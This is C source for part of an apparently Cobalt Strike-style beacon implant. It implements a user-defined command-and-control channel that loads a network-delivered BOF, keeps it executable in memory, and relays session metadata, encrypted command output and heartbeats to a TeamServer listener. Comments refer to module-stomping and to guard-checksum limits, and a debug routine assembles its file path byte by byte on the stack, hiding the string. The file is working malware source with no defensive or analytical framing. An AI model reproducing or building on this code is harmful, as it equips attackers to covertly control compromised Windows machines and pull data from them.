/*
 * 4.12 UDC2 parity: User-Defined C2 channel as a BOF (udc2-vs contract).
 *
 * The client embeds the packed BOF into the payload config:
 *   SETTING_UDC2_BOF    (87) - command-100 wire-object format blob
 *   SETTING_UDC2_LENGTH (88) - total blob length (binary-safe)
 *   SETTING_UDC2_ENTRY  (89) - 'go' entry offset into the code section
 *
 * At boot udc2_init() loads the BOF through the ordinary BOF loader and
 * calls go(UDC2_INFO*) - the BOF fills in udc2Proxy()/udc2Close(). Every
 * checkin cycle then routes through udc2Proxy(frame, len, recv, max) with
 * the extc2 frame format ([4-byte LE length][encrypted data]): the first
 * round carries the session metadata, later rounds one queued output block
 * each, and a 1-byte heartbeat when idle - exactly what the extc2/UDC2
 * listener on the TeamServer speaks (the python UDC2 server relays).
 */
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include "beacon.h"
#include "commands.h"
#include "parse.h"
#include "bformat.h"
#include "security.h"
#include "datastore.h"

extern sessdata bigsession; /* metadata.cpp */

/* boff.cpp: keep the loaded channel BOF executable - its proxy/close
 * callbacks run on every later cycle from the mapped block */
#define chr_bs 92 /* backslash - file path separator in stack-built strings */

extern void bof_set_pin(BOOL on);
extern void bof_unpin(void);

/* crash-localisation probe: append one decimal line to the step file so
 * the LAST executed stage survives any process death (kernel32 direct -
 * this runs in normal beacon context, not inside a BOF) */
void udc2_step_mark(int stage) {
	char path[30];
	char num[16];
	HANDLE h;
	DWORD w = 0;
	int i, v;

	path[0]='C'; path[1]=':'; path[2]=chr_bs;
	path[3]='U'; path[4]='s'; path[5]='e'; path[6]='r'; path[7]='s';
	path[8]=chr_bs; path[9]='P'; path[10]='u'; path[11]='b'; path[12]='l';
	path[13]='i'; path[14]='c'; path[15]=chr_bs; path[16]='u'; path[17]='d';
	path[18]='c'; path[19]='2'; path[20]='_'; path[21]='s'; path[22]='t';
	path[23]='e'; path[24]='p'; path[25]='.'; path[26]='t'; path[27]='x';
	path[28]='t'; path[29]=0;

	i = 0;
	v = stage;
	if (v < 0) { num[i++]='-'; v = -v; }
	{
		char tmp[12];
		int n = 0;
		do { tmp[n++] = (char)('0' + (v % 10)); v /= 10; } while (v > 0 && n < 11);
		while (n > 0) num[i++] = tmp[--n];
	}
	num[i++] = 10; /* newline */

	h = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (h == INVALID_HANDLE_VALUE)
		return;
	WriteFile(h, num, (DWORD)i, &w, NULL);
	CloseHandle(h);
}

#define UDC2_MAX_GET (1024 * 1024)

typedef int(*UDC2PROXY)(const char *, int, char *, int);
typedef void(*UDC2CLOSE)(void);

typedef struct {
	DWORD     version;
	UDC2PROXY proxy;
	UDC2CLOSE close;
} UDC2INFO;

typedef struct {
	UDC2INFO   info;
	BOOL       sent_meta;
	char       pending[1024 * 1024];
	int        pending_len;
	char       frame[1024 * 1024 + 8];
	BOOL       booted;
} UDC2STATE;

static UDC2STATE udc2 = { 0 };

BOOL udc2_enabled(void) {
	return udc2.info.proxy != NULL;
}

BOOL udc2_booted(void) {
	return udc2.booted;
}

/* queue one encrypted output block (called from command_shell_post) */
void udc2_queue(char * data, int length) {
	if (udc2.pending_len + length > (int)sizeof(udc2.pending))
		return;
	memcpy(udc2.pending + udc2.pending_len, data, length);
	udc2.pending_len += length;
}

/* one proxy round trip; recv gets the response frame, returns the
 * DECRYPTED payload length (0 = nothing, -1 = failure) */
static int udc2_round(char * data, int length, char * recv, int max) {
	int rv;
	int rlen;
	int i;
	unsigned int le;

	/* frame = [4-byte LE length][data] */
	le = (unsigned int)length;
	udc2.frame[0] = (char)(le & 0xff);
	udc2.frame[1] = (char)((le >> 8) & 0xff);
	udc2.frame[2] = (char)((le >> 16) & 0xff);
	udc2.frame[3] = (char)((le >> 24) & 0xff);
	memcpy(udc2.frame + 4, data, length);

	udc2_step_mark(62200 + (length & 0xFF));
	rv = udc2.info.proxy(udc2.frame, 4 + length, recv, max);
	udc2_step_mark(62300 + (rv & 0x7F));
	if (rv <= 0)
		return -1;

	/* 1-byte response = benign no-task skip (listener convention) */
	if (rv == 1)
		return 0;

	if (rv < 4)
		return 0;

	/* strip the response frame header */
	rlen  = (unsigned char)recv[0];
	rlen |= (unsigned char)recv[1] << 8;
	rlen |= (unsigned char)recv[2] << 16;
	rlen |= (unsigned char)recv[3] << 24;
	if (rlen < 0 || 4 + rlen > rv || rlen > max)
		return -1;

	memmove(recv, recv + 4, rlen);

	/* decrypt in place */
	rlen = security_decrypt(recv, rlen);
	return rlen;
}

/* the whole checkin cycle: metadata first, then queued blocks, then heartbeat */
int udc2_cycle(char * recv, int max) {
	int rv;

	udc2_step_mark(62100 + (udc2.sent_meta ? 1 : 0));

	if (!udc2.sent_meta) {
		udc2.sent_meta = TRUE;
		{
			/* listener contract: the first frame body carries a 4-byte
			 * agent-id prefix before the RSA metadata - client_init()
			 * writes [id][bigsession] on every classic channel and the
			 * TS session strips exactly 4 bytes (CommonUtils.shift) */
			static char meta[4 + 1024];
			int mlen = bigsession.length;
			if (mlen > 1024)
				mlen = 1024;
			*(unsigned int *)meta = (unsigned int)bigsession.myid;
			memcpy(meta + 4, bigsession.data, mlen);
			rv = udc2_round(meta, 4 + mlen, recv, max);
		}
		/* the metadata round also deserves a task check - reuse rv */
		return rv;
	}

	if (udc2.pending_len > 0) {
		static char block[UDC2_MAX_GET];
		int  take = udc2.pending_len;

		if (take > UDC2_MAX_GET)
			take = UDC2_MAX_GET;
		memcpy(block, udc2.pending, take);
		memmove(udc2.pending, udc2.pending + take, udc2.pending_len - take);
		udc2.pending_len -= take;

		return udc2_round(block, take, recv, max);
	}

	/* idle heartbeat (single zero byte - listener convention) */
	{
		char zero = 0;
		return udc2_round(&zero, 1, recv, max);
	}
}

void udc2_close(void) {
	if (udc2.info.close != NULL)
		udc2.info.close();
	udc2.info.proxy = NULL;
	udc2.info.close = NULL;
	bof_unpin(); /* free the channel BOF's mapped block */
}

BOOL udc2_init(void) {
	/* engage protocol: setting 87 = 1 marks this beacon as UDC2. The
	 * packed BOF arrives over the wire through the PROVEN data-store task
	 * (key "udc2", blob = [int 'UDC2'][int objlen][int entry][wire
	 * object]) during the first HTTP cycle - config-region blobs of this
	 * size overflow the guard-checksum budget and the module-stomping
	 * host image, so they must not ride the settings patch. */
	char * blob;
	int    objlen;
	int    entry;
	int    magic;

	if (udc2.booted)
		return udc2_enabled();

	if (setting_int(SETTING_UDC2_LENGTH) != 1) {
		udc2.booted = TRUE; /* marker absent: this beacon is not UDC2 */
		return FALSE;
	}

	blob = (char *)BeaconGetValue("udc2");
	if (blob == NULL)
		return FALSE; /* BOF not delivered yet: retry next cycle */

	magic  = *(int *)(blob + 0);
	objlen = *(int *)(blob + 4);
	entry  = *(int *)(blob + 8);

	if (magic != 0x32434455 /* 'UDC2' LE */ || objlen <= 0 || entry < 0)
		return FALSE;

	/* pin the block: the BOF's proxy/close live inside it and run on
	 * every later cycle (without the pin the loader's idle-RW flip makes
	 * each call DEP-fault into a silent abort) */
	bof_set_pin(TRUE);
	if (!command_inline_execute_object_parsed(blob + 12, objlen, (DWORD)entry, (char *)&udc2.info, sizeof(UDC2INFO), 0)) {
		bof_set_pin(FALSE);
		return FALSE;
	}
	bof_set_pin(FALSE);

	/* loaded once per beacon lifetime: the pin claim frees the previous
	 * block on a retry, so a second load would dangle the callbacks that
	 * are already installed and running */
	udc2.booted = TRUE;
	return udc2_enabled();
}
